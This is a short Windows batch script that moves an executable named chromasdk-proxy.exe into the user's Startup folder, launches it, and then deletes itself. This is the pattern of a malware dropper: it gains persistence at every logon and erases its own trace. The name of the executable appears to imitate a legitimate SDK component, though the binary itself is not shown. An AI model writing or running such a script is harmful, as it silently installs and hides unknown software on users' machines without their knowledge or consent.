@echo off
set EXE_NAME=chromasdk-proxy.exe
set SOURCE_PATH=%~dp0%EXE_NAME%
set DEST_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
move "%SOURCE_PATH%" "%DEST_PATH%"
start "" "%DEST_PATH%\%EXE_NAME%"
del "%~f0"
del "%SOURCE_PATH%"